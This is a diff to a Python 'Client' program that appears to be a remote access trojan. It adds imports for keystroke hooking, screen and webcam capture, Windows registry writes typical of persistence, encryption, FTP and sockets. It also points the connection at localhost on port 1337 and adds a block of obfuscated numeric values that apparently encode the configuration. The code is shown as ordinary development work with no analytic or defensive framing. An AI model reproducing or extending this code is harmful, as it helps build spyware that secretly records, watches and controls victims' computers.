@@ -43,6 +43,41 @@
 
 '''
 
+import os
+import sys
+import time
+import json
+import socket
+import threading
+import subprocess
+from mss import mss
+from uuid import uuid1
+from ftplib import FTP
+from struct import pack
+from random import choice
+from platform import uname
+from imp import new_module
+from zipfile import ZipFile
+from requests import request
+from logging import getLogger
+from urllib import urlretrieve
+from Crypto.Cipher import AES
+from Crypto.Hash import HMAC, SHA256
+from tempfile import mktemp, gettempdir
+from base64 import b64encode, b64decode
+from logging.handlers import SocketHandler
+from Crypto.Util.number import long_to_bytes, bytes_to_long
+if os.name is 'nt':
+    from ctypes import windll
+    from pyHook import HookManager
+    from pythoncom import PumpMessages
+    from win32com.shell.shell import ShellExecuteEx
+    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
+    from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
+else:
+    from pyxhook import HookManager
+
+
 
 class Client(object):
     
@@ -374,7 +409,7 @@ class Client(object):
     def _connect(self, port=1337):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            __host__ = self._target() 
+            __host__ = 'localhost'
             s.connect((__host__, port))
             return s
         except Exception as e:
@@ -1121,7 +1156,22 @@ class Client(object):
 # -----------------   main   --------------------------
 
 def main(*args, **kwargs):
-    client = Client(**kwargs)
+    client = Client(**{
+            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
+            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
+            "__e__": "423224063517525567299427660991207813087967857812230603629111",
+            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
+            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
+            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
+            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
+            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
+            "__v__": "1",
+	    "__w__": "12095051301478169748777225282050429328988589300942044190524180336593048582637364",
+            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
+            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
+    })
     return client.start()
 
 if __name__ == '__main__':
